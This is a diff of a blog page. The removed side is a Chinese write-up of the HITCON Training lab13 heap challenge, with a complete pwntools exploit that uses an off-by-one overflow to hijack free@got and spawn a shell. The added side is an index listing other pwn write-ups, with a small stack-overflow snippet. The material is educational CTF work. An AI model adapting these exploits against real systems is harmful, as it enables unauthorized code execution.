@@ -22,7 +22,7 @@
     <meta name="description" content>
     <meta http-equiv="Cache-control" content="no-cache">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <title>HITCON Trainging lab13详解 · HackPluto&#39;s Blog</title>
+    <title>HackPluto&#39;s Blog</title>
     <style type="text/css">
     @font-face {
         font-family: 'Oswald-Regular';
@@ -203,23 +203,12 @@
 </head>
 
     
-        <body class="post-body">
-    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
-    
-    <div class="banner">
-            <div class="blog-title">
-                <a href="/">HackPluto&#39;s Blog</a>
-            </div>
-            <div class="post-title">
-                <a href="#" class="post-name">HITCON Trainging lab13详解</a>
-            </div>
-    </div>
     
     <a class="home-link" href="/">HackPluto's Blog</a>
 </header>
@@ -231,74 +220,24 @@
 
 
 
-
-height:50vh;
 ">
     
     <!-- 主页  -->
-    
-    
-    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/intro/2.jpg)"></div>
+    <div class="site-intro-img" style="background-image: url(/)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
-            
-            HITCON Trainging lab13详解
-            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
-            
-            <!-- 404 -->
-            
         </p>
         <!-- 文章页meta -->
-        
-            <div class="post-intros">
-                <!-- 文章页标签  -->
-                
-                    <div class="post-intro-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Heap,overflow,pwn">Heap,overflow,pwn</a>
-    
-</div>
-                
-                
-                    <div class="post-intro-read">
-                        <span>字数统计: <span class="post-count word-count">849</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
-                    </div>
-                
-                <div class="post-intro-meta">
-                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
-                    <span class="post-intro-time">2019/12/11</span>
-                    
-                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
-                        <span class="iconfont-archer">&#xe602;</span>
-                        <span id="busuanzi_value_page_pv"></span>
-                    </span>
-                    
-                    <span class="shareWrapper">
-                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
-                        <span class="shareText">Share</span>
-                        <ul class="shareList">
-                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
-                                <div class="share-qrcode"></div>
-                            </li>
-                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
-                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
-                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
-                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
-                        </ul>
-                    </span>
-                </div>
-            </div>
         
     </div>
 </div>
@@ -399,76 +338,108 @@ height:50vh;
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main post-page">
-    <article class="article-entry">
-        <h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/chunk-extend-shrink/hitcontraning_lab13" target="_blank" rel="noopener">题目地址</a></p>
-<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>先通过IDA看一下程序的功能和重要的数据结构</p>
-<p><img src="https://i.loli.net/2019/12/11/73LDn16qXhjCdRx.jpg" alt></p>
-<p>程序主要是4个功能，创建堆块，修改堆块，显示堆块内容，删除堆块。</p>
-<h2 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h2><h3 id="create-heap"><a href="#create-heap" class="headerlink" title="create_heap"></a>create_heap</h3><p>先看一下创建堆块里的内容</p>
-<p><img src="https://i.loli.net/2019/12/11/8FT3gCI7tn19lhK.jpg" alt></p>
-<p>程序在bss段有一个heaparray数组用来存储堆的指针。程序还有一个heap的结构体，存在两个内容，一个是size域用来记录堆块的大小，一个是content指针，指向malloc的堆块。<br>程序每执行一次create_heap会malloc两次，第一次是malloc一个heap结构体用来存储接下来存储数据堆块的大小和地址，第二次malloc是创建一个存储数据的堆块。</p>
-<p><img src="https://i.loli.net/2019/12/11/FXuLAzyhw1RnPxM.jpg" alt></p>
-<h3 id="edit-heap"><a href="#edit-heap" class="headerlink" title="edit_heap"></a>edit_heap</h3><p>重点是这行代码，输入的字符长度是比设定值大1，存在off-by-one漏洞</p>
-<p><img src="https://i.loli.net/2019/12/11/K1AGboXdFfSekzV.jpg" alt></p>
-<p>read_input函数</p>
-<p><img src="https://i.loli.net/2019/12/11/sGJOx6nc7AIfrKq.jpg" alt></p>
-<h3 id="delete-heap"><a href="#delete-heap" class="headerlink" title="delete_heap"></a>delete_heap</h3><p>删除函数需要注意的是一共free了两个堆块，并且最后将heaparry指针清零</p>
-<p><img src="https://i.loli.net/2019/12/11/GaKiJ6kZ5FwENcy.jpg" alt></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>程序的漏洞点已经找到了，就在read_input()函数里存在一个字节的溢出。我们的最终目的是执行system(“/bin/sh”)所以程序的利用思路如下:</p>
-<ul>
-<li>1.先执行两次create，创建出4个堆块，然后堆第一个堆块修改数据，造成一个字节的溢出，改变第二个数据堆块的struct堆块的size。</li>
-<li>2.将struct的size改成fastbin的大小范围内这样free的时候再申请这个size的话就会立即获取这个fastbin了。为什么要这么做呢，因为程序不能直接执行system函数，所以需要将free的got地址改成system的地址。第一步就是泄漏出system函数的地址，泄漏地址只能通过show函数，show只能打印struct中content指针指向的内容，所以要想打印出free函数的地址，必须覆盖掉struct中content指针。</li>
-<li>3.因为上面的堆块size的内容已经被扩大了，但是实际大小是不可能改变的，所以可写的范围已经覆盖到了下面的堆块里。</li>
-</ul>
-<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
-<p>完整脚本<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">heap = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(<span class="string">"4"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">"dada"</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">"ddaa"</span>)  <span class="comment"># 1</span></span><br><span class="line"><span class="comment"># overwrite heap 1's struct's size to 0x41</span></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + <span class="string">"a"</span> * <span class="number">0x10</span> + <span class="string">"\x41"</span>)</span><br><span class="line"><span class="comment"># trigger heap 1's struct to fastbin 0x40</span></span><br><span class="line"><span class="comment"># heap 1's content to fastbin 0x20</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># new heap 1's struct will point to old heap 1's content, size 0x20</span></span><br><span class="line"><span class="comment"># new heap 1's content will point to old heap 1's struct, size 0x30</span></span><br><span class="line"><span class="comment"># that is to say we can overwrite new heap 1's struct</span></span><br><span class="line"><span class="comment"># here we overwrite its heap content pointer to free@got</span></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(heap.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">r.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = r.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line"><span class="comment"># overwrite free@got with system addr</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"><span class="comment"># trigger system("/bin/sh")</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
-<p><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt><br><img src alt></p>
-
-    </article>
-    <!-- license  -->
+            <main class="main index-page">
     
-        <div class="license-wrapper">
-            <p>原文作者：<a href="http://yoursite.com">HackPluto</a>
-            </p><p>原文链接：<a href="http://yoursite.com/2019/12/11/HITCON-Trainging-lab13/">http://yoursite.com/2019/12/11/HITCON-Trainging-lab13/</a>
-            </p><p>发表日期：<a href="http://yoursite.com/2019/12/11/HITCON-Trainging-lab13/">December 11th 2019, 7:50:21 am</a>
-            </p><p>更新日期：<a href="http://yoursite.com/2019/12/11/HITCON-Trainging-lab13/">December 11th 2019, 9:59:49 am</a>
-            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/04/14/pwnable-kr-WriteUp/">
+            
+                <span>pwnable.kr WriteUp</span>
+        </a>
+        <div class="abstract-content">
+            在网上发现了一个pwn的题库，页面非常的可爱，所以就做了下，在这里记录下做题的过程。题目网址是：http://pwnable.kr/play.php页面是不是非常可爱
+Toddler’s Bottlefd首先是第一题，和文件描述符有关
+文件描述符Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。
+特点
+每个文件描述符会与一个打开的文件相对应
+不同的文件描述符也可能指向同一个文件
+相同的文件可以被不同的进程打开...
         </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/14</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="unlink,heap,pwn">unlink,heap,pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/04/14/HITCON-Training-Writeup/">
+            
+                <span>HITCON-Training-Writeup</span>
+        </a>
+        <div class="abstract-content">
+            HITCON-Training-Writeup最近在学习PWN，学习完了知识点，就找了一些题库来练习，HITCON-Training是一个对新手十分友好的题库，题目基本涵盖了ctf pwn中的所有常见知识点。
+题目链接
+在我学习的过程中也参考了网上的一些教程，但是网上的很多东西写的云龙混杂，EXP教程执行出来都是错的也有一些代码写的很冗杂，所以我就想自己写一篇教程。这个WP的所有代码都是我运行之后无误的，所以可参考的价值比较高。
+lab1-sysmagic我们发现flag的输出和输入并没有关系，而且输入分检测只有if一个判断，使用IDA修改指令即可。修改JNZ的机器码为74,即可修改为J...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/14</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="unlink,heap,pwn">unlink,heap,pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/04/14/BUUCTF刷题记录/">
+            
+                <span>BUUCTF刷题记录</span>
+        </a>
+        <div class="abstract-content">
+            1.test_your_nc直接使用nc命令即可，本来还以为会有欢迎页面什么的，结果就是黑屏直接输入命令
+2.rip简单的栈溢出12345678from pwn import *p = process('./pwn1')#p = remote("node3.buuoj.cn",27060)payload = "a"*15+"BBBBBBBB"+p64(0x040118a)p.sendline(payload)p.interactive()
+3.warmup_csaw_2016简单的栈溢出，将返回地址改成上面这个函数就行12345678from pwn import *sh = proce...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/04/14</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="unlink,heap,pwn">unlink,heap,pwn</a>
+    
+</div>
+            
+        </div>
+    </article>
     
     <!-- paginator  -->
-    <ul class="post-paginator">
-        <li class="next">
-            
-                <div class="nextSlogan">Next Post</div>
-                <a href="/2020/01/03/PowerPC汇编学习/" title="PowerPC汇编学习">
-                    <div class="nextTitle">PowerPC汇编学习</div>
-                </a>
-            
-        </li>
-        <li class="previous">
-            
-                <div class="prevSlogan">Previous Post</div>
-                <a href="/2019/11/11/Linux堆溢出unlink攻击/" title="Linux堆溢出unlink攻击">
-                    <div class="prevTitle">Linux堆溢出unlink攻击</div>
-                </a>
-            
-        </li>
-    </ul>
-    <!-- 评论插件 -->
-    <!-- 来必力City版安装代码 -->
-
-<!-- City版安装代码已完成 -->
     
-    
-    <!-- partial('_partial/comment/changyan') -->
-    <!--PC版-->
-
-
-    
-    
-
-    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -548,24 +519,6 @@ height:50vh;
 </footer>
     </div>
     <!-- toc -->
-    
-    <div class="toc-wrapper" style=
-    
-
-
-
-
-
-
-
-top:50vh;
-
-    >
-        <div class="toc-catalog">
-            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
-        </div>
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#题目链接"><span class="toc-number">1.</span> <span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#题目分析"><span class="toc-number">2.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#程序分析"><span class="toc-number">2.1.</span> <span class="toc-text">程序分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create-heap"><span class="toc-number">2.1.1.</span> <span class="toc-text">create_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#edit-heap"><span class="toc-number">2.1.2.</span> <span class="toc-text">edit_heap</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#delete-heap"><span class="toc-number">2.1.3.</span> <span class="toc-text">delete_heap</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li></ol>
-    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -1117,142 +1070,9 @@ top:50vh;
     
     
     
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
-    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 45
+        Total : 40
         </div>
         <!-- search  -->
         
@@ -1268,17 +1088,17 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/BUUCTF_pwn_writeup/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/pwnable-kr-WriteUp/">pwnable.kr WriteUp</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2020/03/14/ctfhub_pwn刷题WP/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/BUUCTF刷题记录/">BUUCTF刷题记录</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2020/03/11/Pwnable.kr详解/">[Untitled Post]</a>
+            <span class="archive-post-date">04/14</span><a class="archive-post-title" href="/2020/04/14/HITCON-Training-Writeup/">HITCON-Training-Writeup</a>
         </li>
     
     
@@ -1289,21 +1109,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2020/03/02/how2heap/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/HITCON Training Writeup/">[Untitled Post]</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">02/07</span><a class="archive-post-title" href="/2020/02/07/pwnxyz/">[Untitled Post]</a>
         </li>
     
     
@@ -1319,11 +1124,6 @@ top:50vh;
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">12/11</span><a class="archive-post-title" href="/2019/12/11/HITCON-Trainging-lab13/">HITCON Trainging lab13详解</a>
-        </li>
     
     
         <li class="archive-post-item">
@@ -1353,11 +1153,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">10/17</span><a class="archive-post-title" href="/2019/10/17/堆的分配原理分析/">堆的分配原理分析</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">10/14</span><a class="archive-post-title" href="/2019/10/14/ucore-lab0,lab1/">ucore_lab0,lab1</a>
         </li>
     
     
@@ -1462,12 +1257,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
         </li>
     
     
@@ -1487,12 +1282,12 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/python下多核/">python下多核，单核CPU对于并行，并发执行效率的对比</a>
+            <span class="archive-post-date">04/19</span><a class="archive-post-title" href="/2019/04/19/sqli-labs/">sqli-labs 通关详解</a>
         </li>
     
     
@@ -1505,6 +1300,8 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
         <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
@@ -1512,10 +1309,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
-    
-        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
-    
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
     
         <span class="sidebar-tag-name" data-tags="powerpc,汇编"><span class="iconfont-archer">&#xe606;</span>powerpc,汇编</span>
     
@@ -1527,25 +1320,27 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="信息收集,社会工程学"><span class="iconfont-archer">&#xe606;</span>信息收集,社会工程学</span>
     
+        <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+    
         <span class="sidebar-tag-name" data-tags="动态规划(DP)"><span class="iconfont-archer">&#xe606;</span>动态规划(DP)</span>
     
         <span class="sidebar-tag-name" data-tags="PWN,BROP,栈溢出"><span class="iconfont-archer">&#xe606;</span>PWN,BROP,栈溢出</span>
     
-        <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
+        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
         <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
     
-        <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
-    
-        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
+        <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
-        <span class="sidebar-tag-name" data-tags="工具,python,proxy"><span class="iconfont-archer">&#xe606;</span>工具,python,proxy</span>
+        <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
     
         <span class="sidebar-tag-name" data-tags="栈溢出,PWN"><span class="iconfont-archer">&#xe606;</span>栈溢出,PWN</span>
     
         <span class="sidebar-tag-name" data-tags="CCProxy,栈溢出,pwn"><span class="iconfont-archer">&#xe606;</span>CCProxy,栈溢出,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
     
         <span class="sidebar-tag-name" data-tags="unlink,heap,pwn,Android"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn,Android</span>
     
@@ -1559,6 +1354,8 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="工具,python,arp_poison"><span class="iconfont-archer">&#xe606;</span>工具,python,arp_poison</span>
     
+        <span class="sidebar-tag-name" data-tags="unlink,heap,pwn"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn</span>
+    
         <span class="sidebar-tag-name" data-tags="ctf,web,sql注入"><span class="iconfont-archer">&#xe606;</span>ctf,web,sql注入</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,Format String Vulnerability"><span class="iconfont-archer">&#xe606;</span>pwn,Format String Vulnerability</span>
@@ -1568,8 +1365,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="windows,影子账户"><span class="iconfont-archer">&#xe606;</span>windows,影子账户</span>
     
         <span class="sidebar-tag-name" data-tags="Linux,DirtyCow"><span class="iconfont-archer">&#xe606;</span>Linux,DirtyCow</span>
-    
-        <span class="sidebar-tag-name" data-tags="ucore,lab0,lab1"><span class="iconfont-archer">&#xe606;</span>ucore,lab0,lab1</span>
     
